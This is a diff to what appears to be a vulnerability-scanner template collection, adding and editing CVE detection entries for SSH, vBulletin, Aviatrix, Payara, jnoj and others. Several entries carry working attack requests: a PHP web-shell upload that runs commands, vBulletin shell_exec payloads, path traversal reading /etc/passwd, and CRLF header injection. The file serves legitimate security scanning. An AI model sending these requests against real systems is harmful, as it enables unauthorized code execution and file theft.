@@ -1,6 +1,42 @@
 {
   "CVEs": [
     {
+      "id": "CVE-2001-1473",
+      "info": {
+        "author": "iamthefrogy",
+        "classification": {
+          "cve-id": "CVE-2001-1473",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "cvss-score": 7.4,
+          "cwe-id": "CWE-310"
+        },
+        "description": "SSHv1 is deprecated and has known cryptographic issues.",
+        "name": "Deprecated SSHv1 Protocol Detection",
+        "reference": [
+          "https://www.kb.cert.org/vuls/id/684820",
+          "https://nvd.nist.gov/vuln/detail/CVE-2001-1473"
+        ],
+        "severity": "high",
+        "tags": "network,ssh,openssh,cves,cves2001"
+      },
+      "network": [
+        {
+          "host": [
+            "{{Hostname}}",
+            "{{Hostname}}:22"
+          ],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SSH-1"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2005-2428",
       "info": {
         "author": "CasperGN",
@@ -3409,6 +3445,46 @@
       ]
     },
     {
+      "id": "CVE-2010-1870",
+      "info": {
+        "author": "b0yd",
+        "classification": {
+          "cve-id": "CVE-2010-1870",
+          "cvss-metrics": "AV:N/AC:L/Au:N/C:N/I:P/A:N",
+          "cvss-score": 5,
+          "cwe-id": "CWE-917"
+        },
+        "description": "Struts-based OGNL remote code execution in ListSERV Maestro before and including version 9.0-8.",
+        "name": "ListSERV Maestro <= 9.0-8 RCE",
+        "reference": [
+          "https://www.securifera.com/advisories/sec-2020-0001/",
+          "https://packetstormsecurity.com/files/159643/listservmaestro-exec.txt"
+        ],
+        "severity": "info",
+        "tags": "rce,listserv,ognl,cves,cve2010"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "regex": [
+                "LISTSERV Maestro\\s+9\\.0-[123456780]",
+                "LISTSERV Maestro\\s+[5678]",
+                "Administration Hub 9\\.0-[123456780]",
+                "Administration Hub [5678]"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/lui/",
+            "{{BaseURL}}/hub/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1873",
       "info": {
         "author": "daffainfo",
@@ -6745,6 +6821,12 @@
       "id": "CVE-2013-7240",
       "info": {
         "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2013-7240",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
         "description": "Directory traversal vulnerability in download-file.php in the Advanced Dewplayer plugin 1.2 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the dew_file parameter.",
         "name": "WordPress Plugin Advanced Dewplayer 1.2 - Directory Traversal",
         "reference": [
@@ -10523,6 +10605,39 @@
       ]
     },
     {
+      "id": "CVE-2016-4975",
+      "info": {
+        "author": "melbadry9,nadino,xElkomy,sullo",
+        "classification": {
+          "cve-id": "CVE-2016-4975",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-93"
+        },
+        "description": "Apache CRLF injection allowing HTTP response splitting attacks on sites using mod_userdir.",
+        "name": "Apache mod_userdir CRLF injection",
+        "severity": "low",
+        "tags": "crlf,generic,cves,cve2016"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "regex": [
+                "(?m)^(?:Set-Cookie\\s*?:(?:\\s*?|.*?;\\s*?))(crlfinjection=crlfinjection)(?:\\s*?)(?:$|;)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/~user/%0D%0ASet-Cookie:crlfinjection"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-5649",
       "info": {
         "author": "suman_kar",
@@ -10569,6 +10684,43 @@
           "matchers-condition": "and",
           "raw": [
             "GET /BSW_cxttongr.htm HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-6210",
+      "info": {
+        "author": "iamthefrogy",
+        "classification": {
+          "cve-id": "CVE-2016-6210",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 5.9,
+          "cwe-id": "CWE-200"
+        },
+        "description": "OpenSSH 5.3 is vulnerable to username enumeration and DoS vulnerabilities.",
+        "name": "OpenSSH 5.3 Detection",
+        "reference": [
+          "http://seclists.org/fulldisclosure/2016/Jul/51",
+          "https://security-tracker.debian.org/tracker/CVE-2016-6210",
+          "http://openwall.com/lists/oss-security/2016/08/01/2"
+        ],
+        "severity": "medium",
+        "tags": "network,openssh"
+      },
+      "network": [
+        {
+          "host": [
+            "{{Hostname}}",
+            "{{Hostname}}:22"
+          ],
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SSH-2.0-OpenSSH_5.3"
+              ]
+            }
           ]
         }
       ]
@@ -18903,8 +19055,8 @@
           "cwe-id": "CWE-94"
         },
         "description": "vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring request.",
-        "name": "0day RCE in vBulletin v5.0.0-v5.5.4 fix bypass",
-        "reference": "https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/",
+        "name": "RCE in vBulletin v5.0.0-v5.5.4 fix bypass",
+        "reference": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/vbulletin-remote-code-execution-cve-2020-7373/",
         "severity": "critical",
         "tags": "cve,cve2019,vbulletin,rce"
       },
@@ -18926,7 +19078,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();\n"
+            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();\n"
           ]
         }
       ]
@@ -19168,8 +19320,8 @@
           "cvss-score": 7.5,
           "cwe-id": "CWE-22"
         },
-        "description": "Jiangnan Online Judge (aka jnoj) 0.8.0 has Directory Traversal for file reading via the web/polygon/problem/viewfile?id=1&name=../ substring.",
-        "name": "Jnoj Directory Traversal for file reading(LFI)",
+        "description": "Jiangnan Online Judge (aka jnoj) 0.8.0 has directory traversal (LFI) vulnerability via web/polygon/problem/viewfile?id=1&name=../",
+        "name": "Jnoj arbitrary local file inclusion (LFI)",
         "reference": "https://github.com/shi-yang/jnoj/issues/53",
         "severity": "high",
         "tags": "cve,cve2019,jnoj,lfi"
@@ -19193,7 +19345,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n"
+            "GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -19690,6 +19842,52 @@
           "path": [
             "{{BaseURL}}/data/autosuggest-remote.php?q=\"><img%20src=x%20onerror=alert(1)>",
             "{{BaseURL}}/admin/data/autosuggest-remote.php?q=\"><img%20src=x%20onerror=alert(1)>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-20183",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2019-20183",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 7.2,
+          "cwe-id": "CWE-434"
+        },
+        "description": "Simple Employee Records System 1.0 contains an arbitrary file upload due to client-side validation of file extensions. This can be used to upload executable code to the server to obtain access or RCE.",
+        "name": "Simple Employee Records System 1.0 arbitrary file upload",
+        "reference": "https://www.exploit-db.com/exploits/49596",
+        "severity": "high",
+        "tags": "rce,intrusive,cve,upload,cve2019"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "internal": true,
+              "name": "endpoint",
+              "part": "body",
+              "regex": [
+                "(?:[a-zA-Z0-9+\\/])*_poc.php"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            }
+          ],
+          "raw": [
+            "POST /dashboard/uploadID.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------5825462663702204104870787337\n\n-----------------------------5825462663702204104870787337\nContent-Disposition: form-data; name=\"employee_ID\"; filename=\"poc.php\"\nContent-Type: image/png\n\n<?php\n$cmd=$_GET['cmd'];\nsystem($cmd);\n?>\n-----------------------------5825462663702204104870787337--\n",
+            "GET /uploads/employees_ids/{{endpoint}}?cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -23428,7 +23626,7 @@
           "cvss-score": 9.8,
           "cwe-id": "CWE-74"
         },
-        "description": "vBulletin 5.5.4 through 5.6.2 allows remote command execution via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759.\n",
+        "description": "vBulletin 5.5.4 through 5.6.2 allow remote command execution (RCE) via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759.\n",
         "name": "vBulletin Pre-Auth RCE",
         "reference": "https://www.tenable.com/blog/zero-day-remote-code-execution-vulnerability-in-vbulletin-disclosed",
         "severity": "critical",
@@ -23452,7 +23650,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('cat ../../../../../../../../../../../../etc/passwd'); exit;\"\n"
+            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('cat ../../../../../../../../../../../../etc/passwd'); exit;\"\n"
           ]
         }
       ]
@@ -35330,6 +35528,52 @@
       ]
     },
     {
+      "id": "CVE-2021-40870",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-40870",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-434"
+        },
+        "description": "Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.",
+        "name": "Aviatrix Controller 6.x before 6.5-1804.1922. RCE",
+        "reference": [
+          "https://wearetradecraft.com/advisories/tc-2021-0002/",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-40870"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,aviatrix"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "HACKERMAN",
+                "PHP Extension",
+                "PHP Version"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /v1/backend1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nCID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{{randstr}}.php&data=HACKERMAN<?php phpinfo()?>\n",
+            "GET /v1/{{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-40875",
       "info": {
         "author": "oscarintherocks",
@@ -35370,6 +35614,46 @@
             "{{BaseURL}}/testrail/files.md5"
           ],
           "stop-at-first-match": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41381",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-41381",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "cvss-score": 5.3,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Payara Micro Community 5.2021.6 and below allows Directory Traversal",
+        "name": "Payara Micro Community 5.2021.6 Directory Traversal",
+        "reference": [
+          "https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41381"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,payara,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "payara.security.openid.default.providerURI=",
+                "payara.security.openid.sessionScopedConfiguration=true"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/.//WEB-INF/classes/META-INF/microprofile-config.properties"
+          ]
         }
       ]
     }
